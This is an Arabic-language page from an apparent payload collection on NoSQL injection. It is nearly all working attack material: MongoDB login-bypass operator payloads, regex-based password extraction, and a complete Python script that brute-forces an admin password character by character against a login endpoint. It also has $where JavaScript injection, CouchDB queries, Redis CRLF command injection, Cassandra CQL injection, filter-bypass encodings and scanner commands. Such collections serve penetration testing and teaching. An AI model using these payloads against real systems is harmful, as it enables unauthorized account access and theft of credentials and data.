<a id="-nosql-injection-payloads"></a>
# 🍃 حمولات حقن NoSQL

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](NoSQL-Injection.tr.md) • [🇬🇷 Ελληνικά](NoSQL-Injection.el.md)

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> الرسم النصي أعلاه يعرض عنوان المجموعة بالإنجليزية؛ تُشرح الموضوعات والمصطلحات بالعربية في الأقسام التالية.

---

<a id="-mongodb-injection"></a>
## 🎯 حقن MongoDB

<a id="authentication-bypass"></a>
### تجاوز المصادقة
```javascript
// حقن JSON
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// بترميز URL
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

<a id="common-operators"></a>
### المعاملات الشائعة
```javascript
$eq     // يساوي
$ne     // لا يساوي
$gt     // أكبر من
$gte    // أكبر من أو يساوي
$lt     // أصغر من
$lte    // أصغر من أو يساوي
$in     // موجود في المصفوفة
$nin    // غير موجود في المصفوفة
$regex  // تعبير نمطي
$exists // الحقل موجود
$or     // OR منطقي
$and    // AND منطقي
$where  // تعبير JavaScript
```

---

<a id="-basic-payloads"></a>
## 💉 حمولات أساسية

<a id="url-parameter-injection"></a>
### الحقن في معاملات URL
```
# تجاوز المصادقة
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# شروط صحيحة دائمًا
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

<a id="json-body-injection"></a>
### الحقن في جسم JSON
```json
// تجاوز أساسي
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// التجاوز بالتعابير النمطية
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// شرط OR
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// أكبر من
{"username": "admin", "password": {"$gt": ""}}
```

---

<a id="-data-extraction"></a>
## 🔥 استخراج البيانات

<a id="regex-based-extraction"></a>
### الاستخراج باستخدام التعابير النمطية
```javascript
// استخراج كلمة المرور محرفًا بمحرف
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// الاستخراج حسب الموضع
password[$regex]=^.{0}a.*   // هل المحرف الأول هو 'a'؟
password[$regex]=^.{1}b.*   // هل المحرف الثاني هو 'b'؟

// محارف شائعة
password[$regex]=^[a-z].*   // يبدأ بحرف صغير
password[$regex]=^[A-Z].*   // يبدأ بحرف كبير
password[$regex]=^[0-9].*   // يبدأ برقم
```

<a id="blind-boolean-extraction-script"></a>
### سكربت استخراج أعمى يعتمد على الشروط المنطقية
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

<a id="-advanced-payloads"></a>
## 🚀 حمولات متقدمة

<a id="where-javascript-injection"></a>
### حقن JavaScript عبر $where
```javascript
// يعتمد على الانتظار (اختبار أعمى زمني)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// استخراج البيانات
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// يعتمد على الأخطاء
{"$where": "this.constructor.constructor('return this.password')()"}
```

<a id="array-injection"></a>
### حقن المصفوفات
```json
// المعامل $in
{"username": {"$in": ["admin", "administrator", "root"]}}

// المعامل $nin
{"username": {"$nin": ["guest", "anonymous"]}}
```

<a id="operator-injection"></a>
### حقن المعاملات
```
# تحويل الحقل إلى معامل
username=admin&password[$ne]=wrongpassword

# معامل متداخل
username[$eq]=admin&password[$regex]=^p

# معاملات متعددة
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

<a id="-couchdb-injection"></a>
## 🍃 حقن CouchDB

<a id="basic-payloads"></a>
### حمولات أساسية
```javascript
// تجاوز المصادقة
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// تعبير نمطي
{"selector": {"username": {"$regex": ".*"}}}

// أكبر من
{"selector": {"password": {"$gt": null}}}
```

<a id="view-injection"></a>
### حقن العروض (Views)
```javascript
// حقن استعلام Mango
{"selector": {"_id": {"$gt": null}}}

// جلب جميع المستندات
{"selector": {"_id": {"$regex": ".*"}}}
```

---

<a id="-redis-injection"></a>
## 🔴 حقن Redis

<a id="basic-commands"></a>
### أوامر أساسية
```redis
# تعداد المفاتيح
KEYS *
SCAN 0

# استخراج البيانات
GET key_name
HGETALL hash_name

# تعيين البيانات
SET key value
HSET hash field value
```

<a id="command-injection-via-app"></a>
### حقن الأوامر عبر التطبيق
```
# إذا كانت مدخلات المستخدم تمر إلى أوامر Redis
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

<a id="-cassandra-injection"></a>
## 📊 حقن Cassandra

<a id="cql-injection"></a>
### حقن CQL
```sql
-- حقن أساسي
' OR '1'='1
' OR ''='

-- التجاوز باستخدام ALLOW FILTERING
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- حقن التعليقات
admin'--
admin'/*
```

---

<a id="-bypass-techniques"></a>
## 🛡️ تقنيات التجاوز

<a id="url-encoding"></a>
### ترميز URL
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

<a id="unicode-bypass"></a>
### التجاوز باستخدام Unicode
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

<a id="array-syntax-variations"></a>
### صيغ بديلة للمصفوفات
```
# الصيغة القياسية
password[$ne]=

# صيغة بديلة
password[0][$ne]=
password[][$ne]=
```

<a id="content-type-manipulation"></a>
### التلاعب بترويسة Content-Type
```
# التغيير من بيانات نموذج إلى JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

<a id="-injection-points"></a>
## 📝 مواضع الحقن

```
POST /login
- معاملات جسم الطلب (JSON/نموذج)
- معاملات سلسلة الاستعلام

GET /users?id=
- معاملات الاستعلام

الترويسات:
- Authorization
- قيم ملفات تعريف الارتباط

API endpoints:
- GraphQL مع قاعدة MongoDB خلفية
- مرشحات واجهات REST API
```

---

<a id="-detection-checklist"></a>
## 🔍 قائمة التحقق للكشف

```markdown
□ اختبار المعامل $ne: {"field": {"$ne": ""}}
□ اختبار المعامل $gt: {"field": {"$gt": ""}}
□ اختبار $regex: {"field": {"$regex": ".*"}}
□ اختبار $where: {"$where": "1==1"}
□ اختبار صيغة المصفوفات في URL: field[$ne]=
□ اختبار معاملات JSON
□ التحقق من اختلاف أزمنة الاستجابة
□ التحقق من اختلاف أطوال الاستجابة
□ الاختبار باستخدام أنواع محتوى مختلفة
```

---

<a id="-tools"></a>
## 🔗 أدوات

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# ماسح حقن MongoDB
nuclei -t nosql-injection.yaml -u http://target

# الاختبار اليدوي باستخدام curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

<a id="-related-payloads"></a>
## 🔗 حمولات ذات صلة

- [حمولات SQLi](./SQLi.ar.md)
- [حقن GraphQL](./GraphQL-Injection.ar.md)

---

**العودة إلى الحمولات:** [💉 مجموعة الحمولات](../../README.md#-payloads-collection)
